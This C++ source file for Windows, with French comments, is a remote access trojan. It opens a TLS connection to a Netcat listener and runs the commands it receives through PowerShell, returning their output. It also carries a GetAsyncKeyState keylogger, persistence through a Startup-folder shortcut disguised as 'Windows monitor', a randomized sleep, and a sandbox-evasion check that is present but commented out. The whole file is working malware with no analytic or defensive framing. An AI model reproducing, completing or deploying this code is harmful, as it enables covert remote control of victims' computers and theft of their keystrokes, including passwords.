#include <iostream>
#include <WinSock2.h>
#include <Ws2tcpip.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <cstdlib>
#include <array>
#include <shlobj.h>
#include <fstream>
#include <windows.h>
#include <vector>
#include <filesystem>
#include <direct.h>
#include <random>
#include <chrono>
#include <thread>
#include <iphlpapi.h>
#include <fstream>

#define GetCurrentDir _getcwd
#define _CRT_SECURE_NO_WARNINGS

#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "libssl.lib")
#pragma comment(lib, "libcrypto.lib")

std::atomic<bool> isKeyLogRunning(true);
std::thread loggingThread;

SOCKET connectToServer(const char* ipAddress, int port) {
    // Création du socket
    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
        std::cerr << "Erreur lors de la création du socket" << std::endl;
        return INVALID_SOCKET;
    }

    // Configuration de l'adresse de destination
    sockaddr_in serverAddr{};
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(port);

    if (inet_pton(AF_INET, ipAddress, &(serverAddr.sin_addr)) != 1) {
        std::cerr << "Erreur lors de la conversion de l'adresse IP" << std::endl;
        closesocket(sock);
        return INVALID_SOCKET;
    }

    // Connexion au serveur Netcat
    if (connect(sock, reinterpret_cast<sockaddr*>(&serverAddr), sizeof(serverAddr)) == SOCKET_ERROR) {
        std::cerr << "Erreur lors de la connexion au serveur" << std::endl;
        closesocket(sock);
        return INVALID_SOCKET;
    }

    return sock;
}
bool sendMessage(SSL* ssl, const char* message) {
    if (SSL_write(ssl, message, strlen(message)) <= 0) {
        std::cerr << "Erreur lors de l'envoi du message" << std::endl;
        return false;
    }

    return true;
}
bool receiveMessage(SSL* ssl, char* buffer, int bufferSize) {
    int bytesRead = SSL_read(ssl, buffer, bufferSize - 1);
    if (bytesRead <= 0) {
        std::cerr << "Erreur lors de la réception de la réponse" << std::endl;
        return false;
    }
    buffer[bytesRead] = '\0'; // Ajouter un caractère nul à la fin du message reçu

    return true;
}
std::string getTinyPath() {
    char buffer[MAX_PATH];
    DWORD length = GetModuleFileNameA(NULL, buffer, MAX_PATH);

    if (length == 0) {
        throw std::runtime_error("Erreur lors de la récupération du chemin de l'exécutable.");
    }

    return std::string(buffer, length);
}
bool IsFirstRun() {
    std::ifstream markerFile("tiny.ini");
    if (!markerFile) {
        // Le fichier de marqueur n'existe pas, c'est le premier lancement
        std::ofstream newMarkerFile("tiny.ini");
        if (!newMarkerFile) {
            // Erreur lors de la création du fichier de marqueur
            return false;
        }
        return true;
    }
    return false;
}
void SleepRandomDuration() {
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<int> dist(20, 40);
    int duration = dist(gen);

    std::this_thread::sleep_for(std::chrono::seconds(duration));

}
bool IsPhysicalDrive(const std::wstring& driveLetter) {
    std::wstring rootPath = driveLetter + L":\\";
    UINT driveType = GetDriveTypeW(rootPath.c_str());

    if (driveType == DRIVE_FIXED || driveType == DRIVE_REMOVABLE) {
        // DRIVE_FIXED correspond à un disque physique (ex: disque dur interne)
        // DRIVE_REMOVABLE correspond à un disque amovible (ex: clé USB)
        return true;
    }
    else {
        // Autres types de lecteurs (ex: réseau, CD/DVD, virtuel, etc.)
        return false;
    }
}
bool IsVirtualNetworkAdapter() {
    // Obtenir la liste des interfaces réseau
    ULONG bufferSize = 0;
    DWORD result = GetAdaptersAddresses(AF_UNSPEC, GAA_FLAG_INCLUDE_ALL_INTERFACES, NULL, NULL, &bufferSize);
    if (result != ERROR_BUFFER_OVERFLOW) {
        // Erreur lors de la récupération de la taille du tampon
        return false;
    }

    IP_ADAPTER_ADDRESSES* adapterAddresses = reinterpret_cast<IP_ADAPTER_ADDRESSES*>(new BYTE[bufferSize]);
    result = GetAdaptersAddresses(AF_UNSPEC, GAA_FLAG_INCLUDE_ALL_INTERFACES, NULL, adapterAddresses, &bufferSize);
    if (result != ERROR_SUCCESS) {
        // Erreur lors de la récupération des adresses des interfaces réseau
        delete[] adapterAddresses;
        return false;
    }

    // Parcourir les interfaces réseau pour vérifier si l'une d'entre elles est virtuelle
    IP_ADAPTER_ADDRESSES* currentAdapter = adapterAddresses;
    while (currentAdapter != NULL) {
        if (currentAdapter->OperStatus == IfOperStatusUp &&
            (currentAdapter->IfType == IF_TYPE_SOFTWARE_LOOPBACK || currentAdapter->IfType == IF_TYPE_TUNNEL)) {
            // L'interface réseau est virtuelle (boucle locale ou tunnel)
            delete[] adapterAddresses;
            return true;
        }

        currentAdapter = currentAdapter->Next;
    }

    delete[] adapterAddresses;

    // Aucune interface réseau virtuelle n'a été trouvée
    return false;
}
void sandBoxBypass() {
    bool physicalDrive = IsPhysicalDrive(L"C");
    bool virtualNetInt = IsVirtualNetworkAdapter();

    if (!physicalDrive || virtualNetInt) {
        std::exit(0);
    }
}
void keyLog() {
    char c;
    for (;;) {
        if (isKeyLogRunning) {
            for (c = 8; c <= 222; c++) {
                if (GetAsyncKeyState(c) == -32767) {
                    std::ofstream write("Keylog", std::ios::app);
                    if (((c > 64) && (c < 91)) && !(GetAsyncKeyState(0x10))) {
                        c += 32;
                        write << c;
                        write.close();
                        break;
                    }
                    else if ((c > 64) && (c < 91)) {
                        write << c;
                        write.close();
                        break;
                    }
                    else {

                        switch (c) {
                        case 48: {
                            if (GetAsyncKeyState(0x10))
                                write << ")";
                            else
                                write << "0";
                        }
                               break;
                        case 49: {
                            if (GetAsyncKeyState(0x10))
                                write << "!";
                            else
                                write << "1";
                        }
                               break;
                        case 50:
                        {
                            if (GetAsyncKeyState(0x10))

                                write << "@";
                            else
                                write << "2";
                        }
                        break;
                        case 51:
                        {
                            if (GetAsyncKeyState(0x10))
                                write << "#";
                            else
                                write << "3";
                        }
                        break;
                        case 52:
                        {
                            if (GetAsyncKeyState(0x10))
                                write << "$";
                            else
                                write << "4";
                        }
                        break;
                        case 53:
                        {
                            if (GetAsyncKeyState(0x10))
                                write << "%";
                            else
                                write << "5";
                        }
                        break;
                        case 54:
                        {
                            if (GetAsyncKeyState(0x10))
                                write << "^";
                            else
                                write << "6";
                        }
                        break;
                        case 55:
                        {
                            if (GetAsyncKeyState(0x10))
                                write << "&";
                            else
                                write << "7";
                        }
                        break;
                        case 56:
                        {
                            if (GetAsyncKeyState(0x10))
                                write << "*";
                            else
                                write << "8";
                        }
                        break;
                        case 57:
                        {
                            if (GetAsyncKeyState(0x10))
                                write << "(";
                            else
                                write << "9";
                        }
                        break;

                        case VK_SPACE:
                            write << " ";
                            break;
                        case VK_RETURN:
                            write << "\n";
                            break;
                        case VK_TAB:
                            write << "  ";
                            break;
                        case VK_BACK:
                            write << "<BACKSPACE>";
                            break;
                        case VK_DELETE:
                            write << "<Del>";
                            break;

                        default:
                            write << c;
                        }
                    }
                }
            }
        }
        else {
            break;
        }
    }
}
std::string executePowerShellCommand(const std::string& command) {
    std::string powerShellCommand = "powershell.exe -Command \"" + command + "\" 2>&1";

    // Création du flux de données pour la sortie
    std::array<char, 128> buffer;
    std::string output;

    // Ouverture du processus PowerShell en mode lecture
    FILE* pipe = _popen(powerShellCommand.c_str(), "r");
    if (!pipe) {
        
        return output;
    }

    // Lecture de la sortie du processus ligne par ligne
    while (fgets(buffer.data(), buffer.size(), pipe) != nullptr) {
        output += buffer.data();

        // Vérification si la lecture est terminée (détection de la fin de ligne)
        size_t outputLength = output.length();
        if (outputLength >= 2 && output[outputLength - 2] == '\r' && output[outputLength - 1] == '\n') {
            break;
        }
    }

    // Fermeture du processus PowerShell
    _pclose(pipe);

    // Retourne la sortie capturée
    return output;
}
bool CreateStartupShortcut() {
    // Obtenez le chemin complet de l'exécutable du programme
    TCHAR exePath[MAX_PATH];
    GetModuleFileName(NULL, exePath, MAX_PATH);

    // Créez un objet de raccourci de shell
    IShellLink* link;
    CoInitialize(NULL);
    CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_PPV_ARGS(&link));

    // Définissez le chemin d'accès et la description du raccourci de shell
    link->SetPath(exePath);
    link->SetDescription(L"Windows monitor");

    // Obtenez le répertoire de démarrage
    PWSTR startupDir;
    HRESULT result = SHGetKnownFolderPath(FOLDERID_Startup, 0, NULL, &startupDir);
    if (SUCCEEDED(result)) {
        // Créez le chemin complet du raccourci
        std::wstring shortcutPath = std::wstring(startupDir) + L"\\WinMon.lnk";

        // Enregistrez le raccourci de shell dans un fichier
        IPersistFile* file;
        link->QueryInterface(IID_PPV_ARGS(&file));
        file->Save(shortcutPath.c_str(), TRUE);
        file->Release();

        // Libérez la mémoire allouée par SHGetKnownFolderPath
        CoTaskMemFree(startupDir);

        // Libérez les ressources
        link->Release();

        return true;
    }

    // Libérez les ressources en cas d'erreur
    link->Release();

    return false;
}
bool isLocalCommand( const std::string& recherche) {
    std::vector<std::string> tableau = {"persist", "keylog", "keydump", "keystop"};
    for (const std::string& element : tableau) {
        if (element == recherche) {
            return true;
        }
    }
    return false;
}
std::string executeLocalCommand(const std::string& command) {
    if (command == "persist") {
        if (CreateStartupShortcut()) {
            return "OK";
        }
        return "ERROR";
    }
    else if (command == "keylog") {
        loggingThread= std::thread(keyLog);
        return "OK";
    }
    else if (command == "keystop") {
        isKeyLogRunning = false;
        return "OK";
    }
    else if (command == "keydump") {
        return "OK";
    }
}
int main() {
    if (IsFirstRun()) {
        std::cout << "frun !!" << std::endl;
    }
    else {
        SleepRandomDuration();
    }
    //sandBoxBypass();

    // Initialisation de Winsock
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
       
        return 1;
    }

    // Initialisation de la bibliothèque OpenSSL
    SSL_library_init();

    // Création du contexte SSL
    SSL_CTX* sslContext = SSL_CTX_new(TLS_client_method());
    if (sslContext == nullptr) {
        std::cerr << "Erreur lors de la création du contexte SSL" << std::endl;
        WSACleanup();
        return 1;
    }

    // Connexion au serveur Netcat
    SOCKET sock = connectToServer("127.0.0.1", 1292);
    if (sock == INVALID_SOCKET) {
        SSL_CTX_free(sslContext);
        WSACleanup();
        return 1;
    }

    // Création de la structure SSL
    SSL* ssl = SSL_new(sslContext);
    if (ssl == nullptr) {
        
        closesocket(sock);
        SSL_CTX_free(sslContext);
        WSACleanup();
        return 1;
    }

    // Attachement de la structure SSL au socket
    if (SSL_set_fd(ssl, sock) != 1) {
        
        closesocket(sock);
        SSL_free(ssl);
        SSL_CTX_free(sslContext);
        WSACleanup();
        return 1;
    }

    // Négociation SSL
    if (SSL_connect(ssl) != 1) {
        
        closesocket(sock);
        SSL_free(ssl);
        SSL_CTX_free(sslContext);
        WSACleanup();
        return 1;
    }

    // Boucle principale
    while (true) {
        // Réception du message de Netcat
        char buffer[1024] = { 0 };
        std::string output;
        if (!receiveMessage(ssl, buffer, sizeof(buffer))) {
            break;
        }
        if (isLocalCommand(buffer)) {
            output = executeLocalCommand(buffer);
            std::cout << output << std::endl;
        }
        else
        {
            output = executePowerShellCommand(buffer);
            
        }
        
        // Envoi de la réponse "OK\n" à Netcat
        if (!sendMessage(ssl, output.c_str())) {
            break;
        }
    }

    // Fermeture de la connexion SSL
    SSL_shutdown(ssl);
    SSL_free(ssl);
    SSL_CTX_free(sslContext);

    // Nettoyage de la bibliothèque OpenSSL
    ERR_free_strings();
    EVP_cleanup();

    // Fermeture du socket
    closesocket(sock);

    // Nettoyage de Winsock
    WSACleanup();

    return 0;
}